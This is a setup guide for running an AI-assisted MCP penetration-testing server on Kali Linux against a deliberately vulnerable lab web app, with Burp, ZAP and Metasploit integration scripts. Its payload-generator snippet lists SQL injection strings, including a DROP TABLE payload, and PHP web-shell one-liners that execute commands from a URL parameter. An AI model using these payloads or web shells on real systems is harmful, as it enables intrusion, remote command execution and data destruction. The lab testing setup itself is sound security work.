# MCP Security Testing Server - Kali Linux Setup

This guide shows how to run the MCP security testing server on Kali Linux to attack a vulnerable web application running in a Docker container on a Proxmox VM.

## Architecture Overview

```
[Kali Linux Machine] ---> [Proxmox VM] ---> [Docker Container with Vulnerable App]
   MCP Server + AI           Target Network       Target Application
```

## Prerequisites on Kali Linux

### 1. Install Required Packages

```bash
# Update Kali
sudo apt update && sudo apt upgrade -y

# Install Python and pip if not already installed
sudo apt install python3 python3-pip python3-venv git curl -y

# Install Docker (optional, for containerized MCP server)
sudo apt install docker.io docker-compose -y
sudo systemctl enable docker
sudo usermod -aG docker $USER
# Log out and back in for docker group to take effect
```

### 2. Network Connectivity Test

```bash
# Test connectivity to your Proxmox VM
ping <PROXMOX_VM_IP>

# Test HTTP connectivity to your vulnerable app
curl -I http://<PROXMOX_VM_IP>:<PORT>

# Example:
# ping 192.168.1.100
# curl -I http://192.168.1.100:8080
```

## Setup Options

### Option 1: Native Python Setup (Recommended for Kali)

```bash
# Create project directory
mkdir ~/mcp-security-testing
cd ~/mcp-security-testing

# Create virtual environment
python3 -m venv venv
source venv/bin/activate

# Create requirements.txt (see artifact above)
cat > requirements.txt << 'EOF'
mcp>=1.0.0
aiohttp>=3.8.0
requests>=2.31.0
python-dotenv>=1.0.0
beautifulsoup4>=4.12.0
lxml>=4.9.0
EOF

# Install dependencies
pip install -r requirements.txt

# Create the MCP server file (copy from artifact above)
# You can download it or copy-paste the content

# Create environment configuration
cat > .env << 'EOF'
OPENROUTER_API_KEY=your_openrouter_api_key_here
TARGET_URL=http://192.168.1.100:8080
OPENROUTER_MODEL=anthropic/claude-3.5-sonnet
LOG_LEVEL=INFO
EOF

# Edit .env with your actual values
nano .env
```

### Option 2: Docker Setup

```bash
# Create project directory
mkdir ~/mcp-security-testing
cd ~/mcp-security-testing

# Create all the files (requirements.txt, Dockerfile, etc.)
# Then modify docker-compose.yml for external target:

cat > docker-compose.yml << 'EOF'
version: '3.8'

services:
  mcp-security-server:
    build: .
    environment:
      - OPENROUTER_API_KEY=${OPENROUTER_API_KEY}
      - TARGET_URL=${TARGET_URL}
    volumes:
      - ./logs:/app/logs
    network_mode: "host"  # Use host network to access external targets
    stdin_open: true
    tty: true

# No vulnerable-app service since it's external
EOF
```

## Configuration for Your Environment

### 1. Network Configuration

Update your `.env` file with the correct target information:

```bash
# Example configuration
OPENROUTER_API_KEY=sk-or-v1-your-actual-key-here
TARGET_URL=http://192.168.1.100:8080
OPENROUTER_MODEL=anthropic/claude-3.5-sonnet
LOG_LEVEL=INFO
```

### 2. Firewall Considerations

On your Kali machine, ensure outbound connections are allowed:
```bash
# Check if UFW is active
sudo ufw status

# If you need to allow outbound (usually allowed by default)
sudo ufw allow out 80/tcp
sudo ufw allow out 443/tcp
sudo ufw allow out <target_port>/tcp
```

On your Proxmox VM, ensure the Docker container port is accessible:
```bash
# On the Proxmox VM, check if the port is accessible
ss -tlnp | grep :<PORT>

# If using Docker, ensure port mapping is correct
docker ps  # Check port mappings
```

## Running the MCP Server

### Native Python Method:

```bash
cd ~/mcp-security-testing
source venv/bin/activate

# Run the server
python mcp_security_server.py
```

### Docker Method:

```bash
cd ~/mcp-security-testing

# Build and run
docker-compose up --build

# Or run in background
docker-compose up -d --build
```

## Integration with Kali Tools

### 1. Burp Suite Integration

Create a simple proxy script to route MCP findings through Burp:

```bash
cat > burp_integration.py << 'EOF'
#!/usr/bin/env python3
import requests
import json
from mcp_security_server import SecurityTestingMCPServer

# Configure Burp proxy
BURP_PROXY = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

# Use this in your MCP server requests to route through Burp
session = requests.Session()
session.proxies.update(BURP_PROXY)
EOF
```

### 2. Integration with Metasploit

```bash
# Create a simple MSF resource file generator
cat > generate_msf_commands.py << 'EOF'
#!/usr/bin/env python3
def generate_msf_commands(findings):
    """Generate Metasploit commands based on MCP findings"""
    commands = []
    
    for finding in findings:
        if finding['vulnerability_type'] == 'sql_injection':
            commands.append(f"use auxiliary/scanner/http/sqlmap")
            commands.append(f"set RHOSTS {finding['target_ip']}")
            commands.append(f"set TARGETURI {finding['path']}")
            commands.append("run")
        
        elif finding['vulnerability_type'] == 'directory_traversal':
            commands.append("use auxiliary/scanner/http/dir_traversal")
            commands.append(f"set RHOSTS {finding['target_ip']}")
            commands.append("run")
    
    return commands
EOF
```

### 3. OWASP ZAP Integration

```bash
# Install ZAP API Python library
pip install python-owasp-zap-v2.4

# Create ZAP integration script
cat > zap_integration.py << 'EOF'
#!/usr/bin/env python3
from zapv2 import ZAPv2
import time

def integrate_with_zap(target_url, findings):
    """Send MCP findings to OWASP ZAP for verification"""
    zap = ZAPv2(proxies={'http': 'http://127.0.0.1:8080', 
                        'https': 'http://127.0.0.1:8080'})
    
    # Start ZAP spider
    zap.spider.scan(target_url)
    
    # Wait for spider to complete
    while int(zap.spider.status()) < 100:
        time.sleep(1)
    
    # Run active scan
    zap.ascan.scan(target_url)
    
    return zap.core.alerts()
EOF
```

## Advanced Kali Integration Features

### 1. Automated Payload Generation

```bash
cat > payload_generator.py << 'EOF'
#!/usr/bin/env python3
"""
Generate custom payloads based on AI analysis
"""

def generate_custom_payloads(ai_analysis, target_tech_stack):
    """Generate targeted payloads based on AI insights"""
    payloads = []
    
    if 'mysql' in target_tech_stack.lower():
        payloads.extend([
            "' OR 1=1-- -",
            "' UNION SELECT 1,2,3,4,5-- -",
            "'; DROP TABLE users; -- -"
        ])
    
    if 'php' in target_tech_stack.lower():
        payloads.extend([
            "<?php system($_GET['cmd']); ?>",
            "<?php echo shell_exec($_GET['cmd']); ?>"
        ])
    
    return payloads
EOF
```

### 2. Reporting Integration

```bash
cat > report_generator.py << 'EOF'
#!/usr/bin/env python3
"""
Generate penetration testing reports from MCP findings
"""
import json
from datetime import datetime

def generate_pentest_report(findings, target_info):
    """Generate a professional pentest report"""
    
    report = {
        "title": "Automated Security Assessment Report",
        "date": datetime.now().isoformat(),
        "target": target_info,
        "executive_summary": "Generated by AI-powered MCP security testing",
        "findings": findings,
        "recommendations": generate_recommendations(findings)
    }
    
    return report

def generate_recommendations(findings):
    """Generate remediation recommendations"""
    recommendations = []
    
    for finding in findings:
        if finding['type'] == 'sql_injection':
            recommendations.append({
                "finding": finding,
                "recommendation": "Implement parameterized queries and input validation"
            })
    
    return recommendations
EOF
```

## Troubleshooting

### Common Issues on Kali:

1. **Permission Denied for Docker**:
   ```bash
   sudo usermod -aG docker $USER
   # Log out and back in
   ```

2. **Network Connectivity Issues**:
   ```bash
   # Check routing
   ip route show
   
   # Test specific port
   nc -zv <target_ip> <target_port>
   ```

3. **Python Module Issues**:
   ```bash
   # Ensure you're in virtual environment
   source venv/bin/activate
   
   # Reinstall if needed
   pip install --force-reinstall -r requirements.txt
   ```

4. **OpenRouter API Issues**:
   ```bash
   # Test API key
   curl -H "Authorization: Bearer $OPENROUTER_API_KEY" \
        https://openrouter.ai/api/v1/models
   ```

## Security Best Practices

1. **Isolate Testing Environment**: Use separate network segments
2. **Log Everything**: Enable detailed logging for audit trails
3. **Rate Limiting**: Don't overwhelm the target application
4. **Clean Up**: Remove test data and accounts after testing

## Example Testing Workflow

```bash
# 1. Start the MCP server
python mcp_security_server.py

# 2. In another terminal, test basic connectivity
curl -X POST http://localhost:8000/mcp \
  -H "Content-Type: application/json" \
  -d '{"tool": "web_request", "arguments": {"method": "GET", "path": "/"}}'

# 3. Run AI analysis
curl -X POST http://localhost:8000/mcp \
  -H "Content-Type: application/json" \
  -d '{"tool": "analyze_with_ai", "arguments": {"content": "<response>", "analysis_type": "vulnerability_scan"}}'

# 4. Perform automated scans
curl -X POST http://localhost:8000/mcp \
  -H "Content-Type: application/json" \
  -d '{"tool": "security_scan", "arguments": {"scan_type": "sql_injection", "target_path": "/login", "parameters": ["username"]}}'
```

This setup gives you a powerful AI-assisted penetration testing platform running on Kali Linux!